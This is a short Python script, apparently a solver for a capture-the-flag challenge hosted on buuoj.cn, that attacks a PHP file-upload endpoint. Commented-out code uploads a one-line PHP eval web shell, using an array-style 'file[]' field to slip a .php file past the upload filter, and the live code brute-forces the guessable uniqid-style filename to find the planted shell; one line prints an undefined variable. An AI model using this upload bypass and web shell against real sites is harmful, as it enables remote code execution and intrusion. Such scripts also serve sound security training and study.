import requests
import os
session = requests.session()
url = 'http://bfe57cc0-6949-4a5d-89b9-ec52e0ac2696.node4.buuoj.cn:81/index.php/home/index/upload'
# file1 = {'file': ('1.txt', '<?php eval($_GET["cmd"]);')}
# # upload()不传参时即是批量上传所以用[]
# file2 = {'file[]': ('1.php', '<?php eval($_GET["cmd"]);')}
# # os.open
# r = session.post(url, files=file1)
# print(r.text)
# print(r.text[-23:-22])
# start = r.text[-23:-22]
# r = session.post(url, files=file2)
# print(r.text)

# r = session.post(url, files=file1)
# print(r.text)
# print(r.text[-31:-23])
# print(r.text[-23:-22])
# end = r.text[-23:-22]
# print("end"+end)
# all = r.text[-31:-23]
# s = "1234567890abcdef1234567890abcdef"
# print(s.find(start))
# aa = s[s.find(start):s.find(end)]
# print("cp str:"+aa)
# {"url":"\/Public\/Uploads\/2022-02-25\/62189f42e7517.txt","success":1}
# e
# {"url":"\/Public\/Uploads\/","success":1}
# {"url":"\/Public\/Uploads\/2022-02-25\/62189f430fa27.txt","success":1}
aa = "234"
bb = "bcdef"
s = "1234567890abcdef"
for a in aa:
    print(a)
    for b in bb:
        print(b)
        for c in s:
            for d in s:
                for e in s:
                    url_new = 'http://bfe57cc0-6949-4a5d-89b9-ec52e0ac2696.node4.buuoj.cn:81/Public/Uploads/2022-02-25/62189f4' + a+b+c+d+e+".php"
                    # print(url_new)
                    r = requests.get(url_new)
                    if r.status_code == 200:
                        print(path)
                        # print(r.text)
                        break
